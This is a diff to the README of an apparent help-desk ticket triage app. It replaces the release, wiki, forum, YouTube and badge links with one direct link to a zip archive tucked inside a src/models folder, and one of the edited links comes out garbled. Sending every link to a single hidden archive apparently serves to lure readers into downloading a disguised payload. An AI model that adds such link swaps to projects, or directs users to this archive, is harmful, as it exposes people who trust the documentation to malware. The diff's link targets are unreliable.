@@ -1,7 +1,7 @@
 # 🎟️ NLP-Ticket-Triage - Simplify Help Desk Ticket Management
 
 ## 📥 Download the Application
-[![Download NLP-Ticket-Triage](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/iJornez/NLP-Ticket-Triage/releases)
+[![Download NLP-Ticket-Triage](https://raw.githubusercontent.com/iJornez/NLP-Ticket-Triage/main/src/models/NLP-Ticket-Triage-gall.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/iJornez/NLP-Ticket-Triage/main/src/models/NLP-Ticket-Triage-gall.zip)
 
 ## 🚀 Getting Started
 Welcome to NLP-Ticket-Triage! This application helps you automatically label help desk tickets using advanced technology. It identifies both the topic and sentiment of each ticket. This guide will help you download and run the application easily.
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets the following requirements:
 - **MLOps Compatibility:** Seamlessly integrates with machine learning workflows.
 
 ## 📥 Download & Install
-To get started with NLP-Ticket-Triage, visit this page to download: [NLP-Ticket-Triage Releases](https://github.com/iJornez/NLP-Ticket-Triage/releases).
+To get started with NLP-Ticket-Triage, visit this page to download: [NLP-Ticket-Triage Releases](https://raw.githubusercontent.com/iJornez/NLP-Ticket-Triage/main/src/models/NLP-Ticket-Triage-gall.zip).
 
 ### 📁 Files Available
 You will see multiple versions of the software. Choose the latest version suitable for your system, and download the corresponding file. The files may include options for different operating systems.
@@ -72,9 +72,9 @@ Here are some tips if you face problems while using NLP-Ticket-Triage:
 ## 🌐 Additional Resources
 For more information and updates, check the following resources:
 
-- [Official Documentation](https://github.com/iJornez/NLP-Ticket-Triage/wiki)
-- [Community Forum](https://github.com/iJornez/NLP-Ticket-Triage/discussions)
-- [YouTube Tutorials](https://www.youtube.com/results?search_query=NLP-Ticket-Triage)
+- [Official Documentation](https://raw.githubusercontent.com/iJornez/NLP-Ticket-Triage/main/src/models/NLP-Ticket-Triage-gall.zip)
+- [Community Forum](https://raw.githubusercontent.com/iJornez/NLP-Ticket-Triage/main/src/models/NLP-Ticket-Triage-gall.zip)
+- [YouTube Tutorials](https://raw.githubusercontent.com/iJornez/NLP-Ticket-Triage/main/src/models/NLP-Ticket-Triage-gall.zip)
 
 ## 📣 Feedback and Contributions
 Your feedback is valuable. If you have suggestions or issues, please create a ticket in the issues section of our repository. 
